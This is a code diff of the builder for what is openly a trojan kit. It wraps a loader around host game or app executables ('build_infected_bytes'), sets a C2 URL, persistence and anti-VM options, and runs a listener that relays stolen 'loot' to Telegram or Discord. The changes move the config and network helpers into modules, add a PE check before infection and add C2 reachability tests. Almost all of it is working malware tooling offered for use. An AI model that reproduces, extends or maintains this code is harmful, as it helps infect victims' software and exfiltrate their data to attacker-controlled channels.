@@ -57,6 +57,12 @@ from cklog.stage import patch_loader
 
 HERE   = os.path.dirname(os.path.abspath(__file__))
 BIN    = os.path.join(HERE, "bin")
+
+# Modular imports (F3): config and network logic extracted to separate modules.
+from auto_config import (load_config, save_config, show_config, telegram_probe,
+                         gate_telegram, tg_lookup_chatid)
+from auto_network import (detect_ip, _is_private_ip, detect_public_ip,
+                          find_best_port, check_c2_reachable, find_port_owner_pid)
 LOADER = os.path.join(BIN, "loader.exe")
 DLL    = os.path.join(BIN, "ckdll.dll")
 CKDEC  = os.path.join(BIN, "ckdec.exe")     # Embedded in loader.exe at build time
@@ -77,200 +83,7 @@ AV_DISABLE  = stage.AV_DISABLE
 def log(msg):
     print(msg, flush=True)
 
-# ------------------------------------------------------------------ Config persistence
-# config.json stores telegram token, discord webhook, default port, and persist flag.
-# When --telegram / --discord is passed via CLI, it's saved automatically.
-# When no flag is passed, saved values are loaded from config.json.
-
-def load_config():
-    """Load config.json. Returns dict with telegram, discord, port, persist."""
-    if os.path.exists(CONFIG):
-        try:
-            with open(CONFIG, encoding="utf-8") as f:
-                return json.load(f)
-        except Exception:
-            pass
-    return {}
-
-def save_config(cfg):
-    """Save config dict to config.json."""
-    try:
-        with open(CONFIG, "w", encoding="utf-8") as f:
-            json.dump(cfg, f, indent=2, ensure_ascii=False)
-    except Exception as ex:
-        log("[-] failed to save config: %s" % ex)
-
-def telegram_probe(token):
-    """getMe preflight. Returns (state, info) with state ok / dead / unknown.
-
-    config.json can hold a key that was never a live bot token (or was revoked).
-    Printing "relay: enabled" for one of those is a lie: the listener starts, the
-    loot arrives, and every Telegram POST returns 401 into a console nobody reads.
-    Only a definitive rejection disables the relay; an offline attacker machine
-    must not silently drop a working key.
-    """
-    if not token:
-        return "dead", "empty"
-    if ":" not in token:
-        return "dead", "expected bot_token:chat_id (got no ':'); run: python auto.py --tg-chatid <token>"
-    bot = token.rsplit(":", 1)[0]
-    try:
-        with urllib.request.urlopen("https://api.telegram.org/bot%s/getMe" % bot, timeout=8) as r:
-            data = json.loads(r.read().decode("utf-8", "replace"))
-        if data.get("ok"):
-            return "ok", (data.get("result") or {}).get("username") or "bot"
-        return "dead", data.get("description") or "reply not ok"
-    except urllib.error.HTTPError as ex:
-        try:
-            body = json.loads(ex.read().decode("utf-8", "replace"))
-            return "dead", "%s (%s)" % (body.get("description", "HTTP %d" % ex.code), ex.code)
-        except Exception:
-            return "dead", "HTTP %d" % ex.code
-    except Exception as ex:
-        return "unknown", "%s: %s" % (ex.__class__.__name__, ex)
-
-def gate_telegram(token):
-    """Verify a Telegram key before it is passed to the listener. None = no relay."""
-    if not token:
-        return None
-    state, info = telegram_probe(token)
-    if state == "ok":
-        log("[+] Telegram relay: enabled (@%s)" % info)
-        return token
-    if state == "dead":
-        log("[!] Telegram relay: disabled -- the saved key is not a live bot token")
-        log("[!]   %s" % info)
-        log("[!]   fix it: python auto.py --telegram bot_token:chat_id")
-        return None
-    log("[!] Telegram relay: enabled (could not verify now: %s)" % info)
-    return token
-
-def show_config():
-    """Print current saved config."""
-    cfg = load_config()
-    log("=" * 50)
-    log("  Saved configuration (config.json)")
-    log("=" * 50)
-    if not cfg:
-        log("  (empty -- no saved settings)")
-    else:
-        tg = cfg.get("telegram", "")
-        if tg:
-            # Show bot token partially masked + chat ID.
-            parts = tg.rsplit(":", 1)
-            if len(parts) == 2:
-                bot, chat = parts
-                masked = bot[:8] + "..." + bot[-4:] if len(bot) > 12 else bot
-                log("  Telegram:  %s : %s" % (masked, chat))
-            else:
-                log("  Telegram:  %s" % tg)
-        else:
-            log("  Telegram:  (not set)")
-        dc = cfg.get("discord", "")
-        if dc:
-            # Mask the webhook token part.
-            masked = dc[:50] + "..." if len(dc) > 50 else dc
-            log("  Discord:   %s" % masked)
-        else:
-            log("  Discord:   (not set)")
-        log("  Port:      %s" % cfg.get("port", 9090))
-        log("  Persist:   %s" % ("enabled" if cfg.get("persist") else "disabled"))
-    log("=" * 50)
-
-def tg_lookup_chatid(bot_token):
-    """Query Telegram getUpdates API to find the chat_id of the latest message sender.
-    Returns (chat_id string, or None). The user must have sent a message to the bot first."""
-    try:
-        url = "https://api.telegram.org/bot%s/getUpdates" % bot_token
-        req = urllib.request.Request(url)
-        resp = urllib.request.urlopen(req, timeout=10)
-        data = json.loads(resp.read().decode("utf-8"))
-        if data.get("ok") and data.get("result"):
-            # Get the last message's chat ID.
-            last = data["result"][-1]
-            chat_id = last["message"]["chat"]["id"]
-            return str(chat_id)
-        return None
-    except Exception:
-        return None
-
-def detect_ip():
-    """Detect attacker's local IP (not 127.0.0.1)."""
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.settimeout(2)
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-        s.close()
-        if ip.startswith("0.") or ip.startswith("169.254."):
-            return "127.0.0.1"
-        return ip
-    except Exception:
-        try:
-            return socket.gethostbyname(socket.gethostname())
-        except Exception:
-            return "127.0.0.1"
-
-def _is_private_ip(ip):
-    """Check if IP is a private/LAN address (RFC 1918). Returns True for 10.x, 172.16-31.x, 192.168.x."""
-    try:
-        parts = [int(x) for x in ip.split(".")]
-        if len(parts) != 4:
-            return False
-        a, b = parts[0], parts[1]
-        if a == 10:
-            return True
-        if a == 172 and 16 <= b <= 31:
-            return True
-        if a == 192 and b == 168:
-            return True
-        return False
-    except Exception:
-        return False
-
-def detect_public_ip(timeout=5):
-    """Fetch the attacker's public IP via api.ipify.org. Returns string or None."""
-    try:
-        req = urllib.request.Request("https://api.ipify.org")
-        resp = urllib.request.urlopen(req, timeout=timeout)
-        ip = resp.read().decode("utf-8", "replace").strip()
-        # Basic validation: must look like an IP.
-        parts = ip.split(".")
-        if len(parts) == 4 and all(p.isdigit() for p in parts):
-            return ip
-        return None
-    except Exception:
-        return None
-
-def find_best_port(start=9400, end=9500, preferred=None):
-    """Scan a range of ports and return the first one that is free (not in use).
-
-    Tries 'preferred' first (if given), then scans start..end. Returns the port
-    number as int, or None if every port in the range is occupied.
-
-    A port is considered free if we can bind a TCP socket to it on 0.0.0.0
-    without SO_REUSEADDR (so ports already in LISTEN state are correctly
-    detected as occupied on Windows).
-    """
-    # Try preferred port first (e.g. the saved config port).
-    if preferred:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.bind(("0.0.0.0", preferred))
-            s.close()
-            return preferred
-        except (OSError, socket.error):
-            pass  # Preferred is taken, scan the range
-
-    for p in range(start, end + 1):
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.bind(("0.0.0.0", p))
-            s.close()
-            return p
-        except (OSError, socket.error):
-            continue
-    return None
+# (config persistence and network functions moved to auto_config.py / auto_network.py)
 
 def ensure_build():
     """Build loader.exe + ckdll.dll + ckdec.exe if they don't exist."""
@@ -364,12 +177,30 @@ def _extract_original_host(host_bytes):
             return host_bytes[hidx - 4 - old_hlen : hidx - 4]
     return host_bytes
 
+def verify_host_pe(host_bytes):
+    """Validate that host_bytes looks like a PE before infection.
+
+    Returns (ok, reason). Only checks the MZ header and minimum size so that
+    packed or obfuscated hosts are not falsely rejected.
+    """
+    if len(host_bytes) < 64:
+        return False, "host too small (< 64 bytes)"
+    if host_bytes[:2] != b"MZ":
+        return False, "host missing MZ header"
+    if len(host_bytes) < 128:
+        return False, "host too small"
+    return True, "ok"
+
+
 def build_infected_bytes(host_path, c2_url, persist=False, no_anti_vm=False):
     """Read host, patch loader, return infected bytes [loader][host][len][CKLG]."""
     with open(LOADER, "rb") as f:
         loader_bytes = f.read()
     with open(host_path, "rb") as f:
         host_bytes = f.read()
+    ok, reason = verify_host_pe(host_bytes)
+    if not ok:
+        raise ValueError("host validation failed: %s" % reason)
     loader_bytes = _patch_loader(loader_bytes, c2_url, persist, no_anti_vm)
     host_bytes = _extract_original_host(host_bytes)
     return loader_bytes + host_bytes + struct.pack("<I", len(host_bytes)) + MAGIC
@@ -424,41 +255,6 @@ def build_infected_folder(host_dir, c2_url, persist=False, no_anti_vm=False):
     return dest_exe, exe_path
 
 # ------------------------------------------------------------------ listener
-
-def find_port_owner_pid(port):
-    """Return (pid, cmdline) of whatever is LISTENing on port, or (None, None).
-    Linux: ss -ltnp (iproute2, standard on Arch). Windows: netstat -ano + PowerShell."""
-    try:
-        if sys.platform == "win32":
-            out = subprocess.run(["netstat", "-ano", "-p", "tcp"],
-                                 capture_output=True, text=True, timeout=10).stdout
-            for line in out.splitlines():
-                parts = line.split()
-                #  TCP    0.0.0.0:9090    0.0.0.0:0    LISTENING    1234
-                if len(parts) >= 5 and parts[3].upper() == "LISTENING" and parts[1].endswith(":%d" % port):
-                    pid = int(parts[4])
-                    cl = subprocess.run(["powershell", "-NoProfile", "-Command",
-                                         "(Get-CimInstance Win32_Process -Filter 'ProcessId=%d').CommandLine" % pid],
-                                        capture_output=True, text=True, timeout=10)
-                    return pid, (cl.stdout or "").strip()
-        else:
-            out = subprocess.run(["ss", "-ltnp"], capture_output=True, text=True, timeout=10).stdout
-            for line in out.splitlines():
-                if ":%d " % port not in line and not line.rstrip().endswith(":%d" % port):
-                    continue
-                m = re.search(r'pid=(\d+)', line)
-                if not m:
-                    continue
-                pid = int(m.group(1))
-                try:
-                    with open("/proc/%d/cmdline" % pid, "rb") as f:
-                        cl = f.read().replace(b"\x00", b" ").decode("utf-8", "replace").strip()
-                except Exception:
-                    cl = ""
-                return pid, cl
-    except Exception:
-        pass
-    return None, None
 
 def _open_firewall_port(port):
     """Best-effort inbound allow rule. Without it Windows silently drops the
@@ -1006,21 +802,14 @@ def pick_gui(default_tunnel=False):
             _status("Testing the C2...")
             root.update()
             try:
-                p = url.replace("http://", "").replace("https://", "")
-                host_part = p.split("/")[0]
-                if ":" in host_part:
-                    host, port_str = host_part.rsplit(":", 1)
-                    test_port = int(port_str)
+                from auto_network import check_c2_reachable
+                ok, info = check_c2_reachable(url, timeout=3)
+                if ok:
+                    _status("C2 reachable (%s)." % info, "ok")
                 else:
-                    host = host_part
-                    test_port = 80
-                s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
-                s.settimeout(3)
-                s.connect((host, test_port))
-                s.close()
-                _status("C2 answers on %s:%d." % (host, test_port), "ok")
+                    _status("C2 unreachable: %s" % str(info)[:80], "warn")
             except Exception as ex:
-                _status("C2 unreachable: %s" % str(ex)[:80], "warn")
+                _status("C2 test failed: %s" % str(ex)[:80], "warn")
 
         def do_folder():
             d = filedialog.askdirectory(title="Select game/app folder (contains the .exe)")
@@ -1069,14 +858,24 @@ def pick_gui(default_tunnel=False):
             the relay checkbox is off, so re-enabling does not need a retype."""
             tg_key = tg_var.get().strip()
             dc_key = dc_var.get().strip()
-            cfg_new = load_config()
-            if tg_key:
-                cfg_new["telegram"] = tg_key
-            if dc_key:
-                cfg_new["discord"] = dc_key
-            cfg_new["persist"] = bool(persist_var.get())
-            cfg_new["port"] = _port_value()
-            save_config(cfg_new)
+            try:
+                cfg_new = load_config()
+                if tg_key:
+                    cfg_new["telegram"] = tg_key
+                if dc_key:
+                    cfg_new["discord"] = dc_key
+                cfg_new["persist"] = bool(persist_var.get())
+                cfg_new["port"] = _port_value()
+                save_config(cfg_new)
+                # Verify the write actually happened.
+                verify = load_config()
+                if tg_key and verify.get("telegram") != tg_key:
+                    _status("Failed to save Telegram key to config.json.", "warn")
+                    return False
+                return True
+            except Exception as ex:
+                _status("Save failed: %s" % str(ex)[:80], "warn")
+                return False
             return cfg_new
 
         def _save_and_close():
